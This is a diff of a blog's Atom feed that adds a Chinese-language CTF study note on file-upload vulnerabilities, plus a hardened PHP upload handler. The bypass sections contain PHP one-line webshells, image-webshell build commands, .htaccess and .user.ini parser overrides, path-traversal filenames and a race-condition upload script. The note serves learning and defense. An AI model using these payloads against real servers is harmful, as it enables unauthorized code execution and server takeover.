@@ -5,8 +5,638 @@
   <link href="https://freya-we.github.io/" rel="alternate" type="text/html"/>
   <link href="https://freya-we.github.io/atom.xml" rel="self" type="application/atom+xml"/>
   <id>https://freya-we.github.io/</id>
-  <updated>2026-07-20T03:51:08.532Z</updated>
+  <updated>2026-08-04T02:33:49.385Z</updated>
   <language>zh_CN</language>
+  <entry>
+    <title>CTF Web 文件上传笔记</title>
+    <link href="https://freya-we.github.io/posts/ctf-web-file-upload/" rel="alternate" type="text/html"/>
+    <id>https://freya-we.github.io/posts/ctf-web-file-upload/</id>
+    <published>2026-08-04T00:00:00.000Z</published>
+    <updated>2026-08-04T00:00:00.000Z</updated>
+    <summary>整理 CTF Web 文件上传题中常见的校验绕过、解析差异和逻辑漏洞。</summary>
+    <content type="html"><![CDATA[<blockquote>
+<p>文件上传漏洞学到现在最大的感触就是要有自己的一套思维，不能光生搬硬套网上的payload，打靶场不能只照着wp去操作，一定有自己思考的过程</p>
+</blockquote>
+<hr />
+<h2>目录</h2>
+<ol>
+<li><a href="#%E4%B8%80%E6%BC%8F%E6%B4%9E%E6%9C%AC%E8%B4%A8%E4%B8%8E%E5%8E%9F%E7%90%86">漏洞本质与原理</a></li>
+<li><a href="#%E4%BA%8C%E6%A0%A1%E9%AA%8C%E6%9C%BA%E5%88%B6%E6%80%BB%E8%A7%88">校验机制总览</a></li>
+<li><a href="#%E4%B8%89%E5%89%8D%E7%AB%AF%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87">前端校验绕过</a></li>
+<li><a href="#%E5%9B%9B%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">服务端黑名单绕过</a></li>
+<li><a href="#%E4%BA%94%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">服务端白名单绕过</a></li>
+<li><a href="#%E5%85%AD%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">解析漏洞</a></li>
+<li><a href="#%E4%B8%83%E5%86%85%E5%AE%B9%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%E5%9B%BE%E7%89%87%E9%A9%AC%E4%B8%8E%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93">内容校验绕过（图片马与二次渲染）</a></li>
+<li><a href="#%E5%85%AB%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E">逻辑漏洞</a></li>
+<li><a href="#%E4%B9%9D%E9%85%8D%E5%90%88%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E">配合其他漏洞</a></li>
+<li><a href="#%E5%8D%81%E5%AE%9E%E6%88%98%E6%8E%92%E6%9F%A5%E6%B5%81%E7%A8%8Bchecklist">实战排查流程（Checklist）</a></li>
+<li><a href="#%E5%8D%81%E4%B8%80%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">防御措施</a></li>
+<li><a href="#%E5%8D%81%E4%BA%8C%E7%BB%83%E4%B9%A0%E9%9D%B6%E5%9C%BA%E4%B8%8E%E5%B7%A5%E5%85%B7">练习靶场与工具</a></li>
+</ol>
+<hr />
+<h2>一、漏洞本质与原理</h2>
+<p>文件上传漏洞（File Upload Vulnerability）是指：</p>
+<blockquote>
+<p>Web应用在处理用户上传文件时，没有对上传文件进行严格限制，导致攻击者可以上传恶意文件并执行，从而获得服务器权限。</p>
+<p>漏洞上传：</p>
+<pre><code>攻击者上传木马文件
+↓
+服务器保存
+↓
+访问木马文件
+↓
+执行恶意代码
+↓
+控制服务器
+</code></pre>
+</blockquote>
+<p>其实有个需要注意的点就是：</p>
+<p><strong>文件上传题不只是想办法传一个 PHP 文件。文件以什么名字保存、保存到哪、能不能访问、最后会被谁处理，这几处都可能出问题。</strong></p>
+<p>大致过程：</p>
+<pre><code>找校验点 → 让文件落地 → 找到文件路径 → 想办法触发 → 拿到题目目标
+</code></pre>
+<p>上传成功和代码执行是两回事。文件只能下载，和文件能被 PHP 等 解释，差别很大。常见触发点如下：</p>
+<table>
+<thead>
+<tr>
+<th>触发方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>直接访问</td>
+<td>上传目录可访问且可执行脚本，直接访问 <code>shell.php</code></td>
+</tr>
+<tr>
+<td>文件包含</td>
+<td>图片马（内容伪造为图片，尾部夹带代码）配合 LFI 触发</td>
+</tr>
+<tr>
+<td>解析差异</td>
+<td>利用 Apache / Nginx / IIS 的历史版本或错误配置形成解释链</td>
+</tr>
+<tr>
+<td>配置文件</td>
+<td>在服务器允许用户级配置时，用 <code>.htaccess</code> / <code>.user.ini</code> 改变解析行为</td>
+</tr>
+<tr>
+<td>命令拼接</td>
+<td>文件名进入系统命令，配合命令注入</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>二、校验机制总览</h2>
+<p>遇到“上传失败”先别急着换后缀，先看看拦截发生在哪一层：</p>
+<table>
+<thead>
+<tr>
+<th>校验层</th>
+<th>校验内容</th>
+<th>典型绕过</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>扩展名（黑名单）</td>
+<td>禁止 <code>.php .jsp .asp</code> 等</td>
+<td>大小写、双写、已配置的等价后缀、配置文件</td>
+</tr>
+<tr>
+<td>扩展名（白名单）</td>
+<td>只允许 <code>.jpg .png .gif</code></td>
+<td>需要解析差异、文件包含等组合缺陷</td>
+</tr>
+<tr>
+<td>MIME 类型</td>
+<td><code>Content-Type: image/png</code></td>
+<td>改包伪造</td>
+</tr>
+<tr>
+<td>文件头 / 内容</td>
+<td>校验文件魔术字节或尝试解码</td>
+<td>伪造文件头、合法图片载荷、二次渲染差异</td>
+</tr>
+<tr>
+<td>大小 / 数量</td>
+<td>限制体积与个数</td>
+<td>多文件参数污染、压缩包</td>
+</tr>
+<tr>
+<td>逻辑层</td>
+<td>先存后校验、落地目录可控</td>
+<td>条件竞争、路径穿越、文件覆盖</td>
+</tr>
+</tbody>
+</table>
+<p>做题感受就是</p>
+<p>最好一次只改一个地方。不然扩展名、MIME 和文件内容一起改，很难看出到底是哪一步起作用</p>
+<hr />
+<h2>三、前端校验绕过</h2>
+<p>常用做法：</p>
+<ol>
+<li><strong>禁用或修改 JS</strong>：禁用 JavaScript，或在 DevTools 中修改校验函数和事件处理器。</li>
+<li><strong>直接改包</strong>：用 Burp Suite 或 Yakit 拦截上传请求，修改 <code>filename</code> 与 <code>Content-Type</code> 字段：</li>
+</ol>
+<pre><code>原始请求：
+POST /upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="a.jpg"
+Content-Type: image/jpeg
+
+&lt;?php @eval($_POST['1']); ?&gt;
+
+修改为：
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="a.php"
+Content-Type: image/jpeg
+</code></pre>
+<hr />
+<h2>四、服务端黑名单绕过</h2>
+<p>黑名单题先看它怎么取后缀、怎么比较、过滤几次。下面这些是常见测试项，但都吃环境，不能看到 payload 就直接套。</p>
+<h3>1. 大小写绕过</h3>
+<pre><code>shell.php  →  shell.pHp / shell.Php / SHELL.PHP
+</code></pre>
+<p>只在黑名单区分大小写、后端 handler 又能认混合大小写时有用。Windows 文件系统通常不区分大小写，Linux 通常区分；最后还是看 Web 服务器怎么配。</p>
+<h3>2. 双写绕过</h3>
+<pre><code>shell.pphphp  →  过滤删掉中间的 "php" →  shell.php
+</code></pre>
+<p>对应 <code>str_ireplace("php", "", $name)</code> 这类只替换一次的写法。如果循环过滤，双写一般没用。</p>
+<h3>3. 末尾点、空格与 NTFS ADS</h3>
+<pre><code>shell.php.       →  部分 Windows 文件 API 规范化为 shell.php
+shell.php        →  末尾带空格；部分 Windows 文件 API 会去除空格
+shell.php::$DATA →  在特定 Windows + NTFS 文件 API 组合中指向默认数据流
+</code></pre>
+<p>重点是校验时的名字和 Windows 实际落盘后的名字不一致。Linux 会保留末尾点和空格；<code>::$DATA</code> 也只和 NTFS 场景有关，不是通用截断。</p>
+<h3>4. 等价后缀</h3>
+<pre><code>.php   →  .phtml / .php3 / .php4 / .php5 / .pht 等
+</code></pre>
+<p>前提是黑名单只封了 <code>.php</code>，而且服务器真的给替代后缀配了 PHP handler。不要默认 <code>.phtml</code>、<code>.php5</code> 一定能执行；<code>.phps</code> 很多时候只是源码高亮，甚至没有配置。</p>
+<h3>5. 用户级配置文件</h3>
+<p><strong><code>.htaccess</code>（Apache）</strong>——上传内容为：</p>
+<pre><code>AddType application/x-httpd-php .jpg
+</code></pre>
+<p>能否生效看两个地方：Apache 是否允许 <code>AllowOverride FileInfo</code>，当前 PHP handler 是否接受这个映射。换成 PHP-FPM 或禁掉覆盖后，这招经常失效。</p>
+<p><strong><code>.user.ini</code></strong>——上传内容为：</p>
+<pre><code>auto_prepend_file=filename //包含在文件头 
+auto_append_file=filename //包含在文件尾
+</code></pre>
+<p>这个点一开始容易绕晕，可以把它拆成“目录级配置 + 触发 PHP 文件 + 被包含文件”三部分来看</p>
+<pre><code>例如：
+/upload/
+├── .user.ini
+├── 1.png
+└── index.php
+访问：
+http://target/upload/
+实际流程是：
+GET /upload/
+→ Web 服务器寻找默认首页
+→ 找到 /upload/index.php
+→ 把 index.php 交给 PHP-FPM
+→ PHP 读取 /upload/.user.ini
+→ 先包含 /upload/1.png
+→ 再执行 /upload/index.php
+</code></pre>
+<pre><code>flowchart TD
+    A["浏览器访问 /upload"] --&gt; B["服务器通常重定向到 /upload/"]
+    B --&gt; C{"Web 服务器如何处理目录请求？"}
+
+    C --&gt;|"默认首页是 index.php"| D["内部定位到 /upload/index.php"]
+    C --&gt;|"默认首页是 index.html"| X["返回静态页面&lt;br/&gt;PHP 不启动"]
+    C --&gt;|"没有默认首页"| Y["返回 403 或目录列表&lt;br/&gt;PHP 不启动"]
+    C --&gt;|"重写到根目录 /index.php"| Z["执行根目录 PHP&lt;br/&gt;/upload/.user.ini 通常不生效"]
+
+    D --&gt; E["index.php 被交给 PHP-FPM"]
+    E --&gt; F{"是否启用 .user.ini？"}
+
+    F --&gt;|"未启用"| G["正常执行 /upload/index.php"]
+    F --&gt;|"已启用"| H["PHP 扫描 /upload/.user.ini"]
+
+    H --&gt; I{"是否找到有效配置？"}
+    I --&gt;|"没有找到或缓存未刷新"| G
+    I --&gt;|"找到"| J["读取 auto_prepend_file = 1.png"]
+
+    J --&gt; K["PHP 在服务器内部打开 /upload/1.png"]
+    K --&gt; L["解析 1.png 中的 PHP 标签&lt;br/&gt;执行其中的 PHP 代码"]
+    L --&gt; M["继续执行 /upload/index.php"]
+    M --&gt; N["合并执行结果并返回给浏览器"]
+    G --&gt; N
+
+    X --&gt; O[".user.ini 不会被读取"]
+    Y --&gt; O
+    Z --&gt; O
+   
+</code></pre>
+<p><code>.user.ini</code> 是 PHP CGI/FastCGI 模式下的目录级配置文件。若 <code>user_ini.filename</code> 未被禁用，PHP 执行该目录中的 PHP 脚本时会读取它。通过 <code>auto_prepend_file = "1.png"</code>，可以让 PHP 在执行目标脚本前包含 <code>1.png</code>。<code>1.png</code> 中仍需存在 PHP 代码，而且目录中要有可访问的 PHP 文件用于触发。直接访问图片不会执行其中的 PHP 代码。</p>
+<h3>6. %00 截断（老版本 PHP &lt; 5.3.4）</h3>
+<pre><code>shell.php%00.jpg  →  落地为 shell.php
+</code></pre>
+<p>旧版 PHP 或底层 C API 会把空字节当作字符串结束。注意 <code>%00</code> 要经过 URL 解码才是空字节，直接写在 multipart 的 <code>filename</code> 里通常只是三个普通字符。PHP 5.3.4 之后基本修掉了，现在主要见于复现老环境的题。</p>
+<h3>7. 过滤顺序与特殊字符</h3>
+<p>如果题目会删除文件名里的某些字符，比如 <code>[]</code>，就直接把过滤前后写出来算：</p>
+<pre><code>目标字符串 - 被过滤的字符 = 最终落地的文件名
+</code></pre>
+<p>举例：</p>
+<table>
+<thead>
+<tr>
+<th>过滤规则</th>
+<th>输入文件名</th>
+<th>落地结果</th>
+<th>是否可行</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>删掉 <code>[ ]</code></td>
+<td><code>c[a]t.php</code></td>
+<td><code>cat.php</code></td>
+<td>✅ 绕过了"禁止 cat"</td>
+</tr>
+<tr>
+<td>删掉 <code>[ ]</code></td>
+<td><code>c{a}t.php</code></td>
+<td><code>c{a}t.php</code>（<code>{}</code> 不在黑名单，原样保留）</td>
+<td>❌ 没凑出目标字符串</td>
+</tr>
+<tr>
+<td>删掉所有非字母数字</td>
+<td><code>c{a}t.php</code></td>
+<td><code>cat.php</code></td>
+<td>✅</td>
+</tr>
+<tr>
+<td>白名单只留 <code>[a-zA-Z0-9._-]</code></td>
+<td>任何特殊字符</td>
+<td>被替换/拒绝</td>
+<td>❌ 换什么字符都没用</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>这里利用的是过滤顺序，不是 shell 通配符。只有文件名后来被拼进 shell 命令，<code>[]</code> 和 Bash 的 <code>{}</code> 展开才有关系。</p>
+</blockquote>
+<hr />
+<h2>五、服务端白名单绕过</h2>
+<p>白名单题里，单改 MIME 或补一个图片头，绕不过真正的扩展名检查。通常还得找解析差异、文件包含、配置文件或者上传逻辑的问题。</p>
+<h3>1. 绕过 MIME 层</h3>
+<p>如果只看请求里的 <code>Content-Type</code>，Burp 里直接改。这个字段是客户端自己填的：</p>
+<pre><code>Content-Type: image/jpeg
+</code></pre>
+<h3>2. 绕过浅层文件头校验</h3>
+<p>只校验文件头时，在文件开头拼上图片标识：</p>
+<pre><code>GIF89a
+&lt;?php @eval($_POST['x']); ?&gt;
+</code></pre>
+<p>常见文件签名：</p>
+<table>
+<thead>
+<tr>
+<th>格式</th>
+<th>文件头</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GIF</td>
+<td>47 49 46 38 39 61（GIF89A）或 47 49 46 38 37 61（GIF87A）</td>
+</tr>
+<tr>
+<td>PNG</td>
+<td>89504E47</td>
+</tr>
+<tr>
+<td>JPG</td>
+<td>FF D8 FF</td>
+</tr>
+</tbody>
+</table>
+<p>有文件头不代表真能当图片解码。图片马也不会自己执行，还要搭配文件包含、用户配置或错误等配置</p>
+<h3>3. 多扩展名与名称解析差异</h3>
+<p>Apache 不是只看最后一个后缀，而是会分别处理每个后缀</p>
+<p>例如：</p>
+<pre><code>AddHandler application/x-httpd-php .php
+AddType image/jpeg .jpg
+</code></pre>
+<p>对于：</p>
+<pre><code>shell.php.jpg
+</code></pre>
+<p>Apache 可能得到：</p>
+<pre><code>.php → 使用 PHP 处理
+.jpg → Content-Type 是 image/jpeg
+</code></pre>
+<p>两项可以同时存在，所以文件仍可能被 PHP 执行。</p>
+<h3>4. %00 截断（白名单场景）</h3>
+<pre><code>shell.php%00.jpg  →  截断为 shell.php
+</code></pre>
+<hr />
+<h2>六、解析漏洞</h2>
+<h3>1. Apache 多后缀解析</h3>
+<p><code>shell.php.jpg</code></p>
+<p>Apache 会处理文件的多个后缀。在某些配置下，<code>.php</code> 仍会让文件交给 PHP 执行；现代 PHP-FPM 配置通常不会。具体流程见上</p>
+<h3>2. Nginx 路径解析</h3>
+<pre><code>/upload/shell.jpg/1.php
+</code></pre>
+<p>如果 Nginx 和 PHP-FPM 配置不严，PHP 可能向前找到真实存在的 <code>shell.jpg</code>，并把它当作 PHP 文件执行。配置了 <code>try_files</code> 等限制后通常无法利用。</p>
+<h3>3. IIS 6.0 解析</h3>
+<pre><code>shell.asp;.jpg
+</code></pre>
+<p>IIS 6.0 可能忽略分号后面的内容，把文件当成 <code>shell.asp</code> 解析。</p>
+<p>目录名也可能触发：</p>
+<pre><code>shell.asp/xxx.jpg
+</code></pre>
+<p>如果目录名以 <code>.asp</code> 结尾，目录里的文件可能被当作 ASP 解析。</p>
+<hr />
+<h2>七、内容校验绕过（图片马与二次渲染）</h2>
+<h3>1. 图片马构造</h3>
+<p><strong>直接拼接</strong>（基础版）：</p>
+<pre><code># Linux
+echo 'GIF89a&lt;?php @eval($_POST["x"]);?&gt;' &gt; shell.gif
+# 或把 PHP 代码追加到正常图片尾部
+cat shell.php &gt;&gt; a.jpg
+</code></pre>
+<p><strong>结构合法版</strong>：把代码塞进图片注释、EXIF 或附加数据块，通常能过 <code>getimagesize</code> 这类检查。不过服务端如果用 GD/Imagick 重新编码，元数据多半会被清掉。</p>
+<h3>2. 二次渲染绕过</h3>
+<p>服务端用 GD 库（<code>imagecreatefromgif</code> 等）重新生成图片 → 直接拼接的代码会被抹掉。</p>
+<p><strong>做法</strong>：准备一张原图，让题目处理一次，再对比处理前后的字节。先找稳定不变的区域，再尝试插入。GIF、PNG、库版本和编码参数都会影响结果，没有一个位置能通吃所有题。</p>
+<pre><code># 思路示例：用脚本逐字节 diff 原图与渲染后图片，定位未变化区间
+</code></pre>
+<h3>3. 触发</h3>
+<p>图片马无法被直接执行，必须配合：</p>
+<ul>
+<li>文件包含：<code>?page=upload/shell.jpg</code></li>
+<li><code>.htaccess</code>：<code>AddType application/x-httpd-php .jpg</code></li>
+<li><code>.user.ini</code>：<code>auto_prepend_file=shell.jpg</code></li>
+<li>解析漏洞：Nginx <code>/shell.jpg/1.php</code></li>
+</ul>
+<hr />
+<h2>八、逻辑漏洞</h2>
+<h3>1. 条件竞争（Race Condition）</h3>
+<p>场景：服务端"先保存到磁盘 → 校验不通过 → 删除"。删除有窗口期，抢在删除前访问即可执行。</p>
+<p>利用时让“上传”和“访问临时文件”一起跑，抢在删除前读到固定回显：</p>
+<pre><code>from concurrent.futures import ThreadPoolExecutor, as_completed
+import requests
+
+upload_url = "http://target/upload"
+probe_url = "http://target/upload/race.php"
+payload = b'&lt;?php echo "race-ok"; ?&gt;'
+
+def upload_once():
+    return requests.post(
+        upload_url,
+        files={"file": ("race.php", payload, "application/octet-stream")},
+        timeout=3,
+    )
+
+def probe_once():
+    return requests.get(probe_url, timeout=3)
+
+with ThreadPoolExecutor(max_workers=20) as pool:
+    jobs = [pool.submit(upload_once if i % 2 == 0 else probe_once)
+            for i in range(200)]
+    for job in as_completed(jobs):
+        response = job.result()
+        if "race-ok" in response.text:
+            print("race condition hit")
+            break
+</code></pre>
+<p>如果服务端会改名，还得先从响应或者命名规律里找到临时文件 URL。</p>
+<h3>2. 路径穿越</h3>
+<p>文件名含 <code>../</code> 控制落地目录：</p>
+<pre><code>../../shell.php  →  写到上一级目录（可能是可执行目录）
+</code></pre>
+<p>这里主要看后端会不会保留路径、会不会再做一次 URL 解码。multipart 的 <code>filename</code> 里写 <code>%2f</code>，一般不会自动变成 <code>/</code>。另外还要试清楚 <code>/</code>、<code>\</code>、<code>basename</code> 和路径规范化分别发生在哪一步。</p>
+<h3>3. 文件覆盖</h3>
+<p>若文件名可控且不重命名，可覆盖已存在的文件（如覆盖 <code>index.php</code>、<code>config.php</code>），属于高危逻辑缺陷。</p>
+<h3>4. 目录可控 + 执行目录</h3>
+<p>有些题只在上传目录里禁脚本。如果文件名能穿越到别的可执行目录，原来的限制就管不到了。</p>
+<hr />
+<h2>九、配合其他漏洞</h2>
+<table>
+<thead>
+<tr>
+<th>组合</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>上传 + 文件包含（LFI）</td>
+<td>图片马 + 任意文件读取/包含 → RCE</td>
+</tr>
+<tr>
+<td>上传 + 命令注入</td>
+<td>文件名进入 shell 命令，<code>;</code>、`</td>
+</tr>
+<tr>
+<td>上传 + SQL 注入</td>
+<td>文件名拼入 SQL 查询</td>
+</tr>
+<tr>
+<td>上传 + SSRF</td>
+<td>上传的 URL 触发服务端请求</td>
+</tr>
+<tr>
+<td>ZIP 解压 + 路径穿越</td>
+<td>解压恶意 zip 覆盖任意文件（Zip Slip）</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>十、实战排查流程（Checklist）</h2>
+<p>我一般按这个顺序排：</p>
+<ol>
+<li>先传一张正常小图，把请求和响应留好。</li>
+<li>找上传后的文件名和访问路径，看服务端有没有重命名。</li>
+<li>扩展名、MIME、文件头分开改，一次只动一个地方。</li>
+<li>从响应头、报错、路径格式里猜 Web 服务器、语言和操作系统，但别只信 <code>Server</code>。</li>
+<li>黑名单先试大小写、双写和已知替代后缀，再看 Windows 文件名特性。</li>
+<li>白名单先分清它只看文件头，还是真的解码、重绘了图片。</li>
+<li>文件传上去以后，用固定回显确认是否解析。不能执行就继续找 LFI、配置文件或路径问题。</li>
+<li>最后再看先存后删、随机文件名、目录穿越、覆盖和压缩包解压这些逻辑点。</li>
+</ol>
+<p><strong>常用验证 payload</strong>：</p>
+<pre><code>&lt;?php echo 'upload-ok'; ?&gt;                         // 只验证 PHP 解析
+&lt;?php if (isset($_GET['cmd'])) system($_GET['cmd']); ?&gt; // CTF 命令执行
+&lt;?php phpinfo(); ?&gt;                                // 查看题目 PHP 环境
+</code></pre>
+<hr />
+<h2>十一、防御措施</h2>
+<p><strong>安全代码骨架（PHP 7+ 示例）</strong>：</p>
+<pre><code>&lt;?php
+declare(strict_types=1);
+
+const MAX_UPLOAD_BYTES = 5 * 1024 * 1024;
+const MAX_IMAGE_PIXELS = 20000000;
+
+if (!isset($_FILES['file'])
+    || !is_array($_FILES['file'])
+    || !isset($_FILES['file']['error'], $_FILES['file']['tmp_name'], $_FILES['file']['name'])
+    || is_array($_FILES['file']['error'])
+    || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
+    http_response_code(400);
+    exit('upload failed');
+}
+
+$file = $_FILES['file'];
+$tmp = $file['tmp_name'];
+$size = filesize($tmp);
+
+if (!is_uploaded_file($tmp) || $size === false || $size &gt; MAX_UPLOAD_BYTES) {
+    http_response_code(400);
+    exit('invalid upload');
+}
+
+$allowed = [
+    'jpg' =&gt; ['mime' =&gt; 'image/jpeg', 'type' =&gt; IMAGETYPE_JPEG],
+    'png' =&gt; ['mime' =&gt; 'image/png',  'type' =&gt; IMAGETYPE_PNG],
+    'gif' =&gt; ['mime' =&gt; 'image/gif',  'type' =&gt; IMAGETYPE_GIF],
+];
+
+$ext = strtolower(pathinfo((string) $file['name'], PATHINFO_EXTENSION));
+if (!isset($allowed[$ext])) {
+    http_response_code(415);
+    exit('unsupported extension');
+}
+
+$mime = (new finfo(FILEINFO_MIME_TYPE))-&gt;file($tmp);
+$info = @getimagesize($tmp);
+$expected = $allowed[$ext];
+
+if ($info === false
+    || $mime !== $expected['mime']
+    || $info[2] !== $expected['type']
+    || $info[0] * $info[1] &gt; MAX_IMAGE_PIXELS) {
+    http_response_code(415);
+    exit('invalid image');
+}
+
+switch ($info[2]) {
+    case IMAGETYPE_JPEG:
+        $image = @imagecreatefromjpeg($tmp);
+        break;
+    case IMAGETYPE_PNG:
+        $image = @imagecreatefrompng($tmp);
+        break;
+    case IMAGETYPE_GIF:
+        $image = @imagecreatefromgif($tmp);
+        break;
+    default:
+        $image = false;
+}
+
+if ($image === false) {
+    http_response_code(415);
+    exit('decode failed');
+}
+
+// UPLOAD_DIR 应位于 Web 根目录外，并预先设置最小权限。
+$name = bin2hex(random_bytes(16)) . '.' . $ext;
+$path = rtrim(UPLOAD_DIR, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
+
+switch ($info[2]) {
+    case IMAGETYPE_JPEG:
+        $saved = imagejpeg($image, $path, 90);
+        break;
+    case IMAGETYPE_PNG:
+        $saved = imagepng($image, $path, 6);
+        break;
+    case IMAGETYPE_GIF:
+        $saved = imagegif($image, $path);
+        break;
+    default:
+        $saved = false;
+}
+imagedestroy($image);
+
+if (!$saved) {
+    http_response_code(500);
+    exit('save failed');
+}
+
+echo $name;
+</code></pre>
+<p>必须用 Nginx 直接提供上传文件时，可以给上传目录单独配一个静态 location。能放到 Web 根目录外或独立静态域名更省心。</p>
+<pre><code>location ^~ /uploads/ {
+    types { }
+    default_type application/octet-stream;
+    add_header X-Content-Type-Options nosniff always;
+    try_files $uri =404;
+}
+</code></pre>
+<hr />
+<h2>十二、练习靶场与工具</h2>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>名称</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>靶场</td>
+<td>Upload-Labs</td>
+<td>21 关专项练习文件上传，逐关递进</td>
+</tr>
+<tr>
+<td>靶场</td>
+<td>DVWA</td>
+<td>经典综合靶场，含文件上传模块</td>
+</tr>
+<tr>
+<td>靶场</td>
+<td>Pikachu</td>
+<td>中文靶场，覆盖多种 Web 漏洞</td>
+</tr>
+<tr>
+<td>靶场</td>
+<td>PortSwigger Web Security Academy</td>
+<td>文件上传实验覆盖类型校验、路径和解析配置</td>
+</tr>
+<tr>
+<td>靶场</td>
+<td>Sqli-labs 衍生</td>
+<td>部分关卡含上传与包含组合</td>
+</tr>
+<tr>
+<td>工具</td>
+<td>Burp Suite 或 Yakit</td>
+<td>抓包改包，绕过前端/MIME 校验</td>
+</tr>
+<tr>
+<td>工具</td>
+<td>蚁剑（AntSword）</td>
+<td>连接一句话 webshell</td>
+</tr>
+<tr>
+<td>工具</td>
+<td>冰蝎 / 哥斯拉</td>
+<td>加密流量 webshell 管理（进阶）</td>
+</tr>
+<tr>
+<td>工具</td>
+<td>exiftool</td>
+<td>往图片 EXIF 里插 payload</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>最后记一下</h2>
+<blockquote>
+<p>先找过滤点，再找落地路径和触发方式。上传成功不等于解析成功，网上看到的 payload 也不一定适合题目环境。</p>
+</blockquote>
+]]></content>
+    <author>
+      <name>Freya</name>
+    </author>
+    <category term="Web安全"></category>
+  </entry>
   <entry>
     <title>First CTF Note</title>
     <link href="https://freya-we.github.io/2026/02/07/first-ctf-note/" rel="alternate" type="text/html"/>
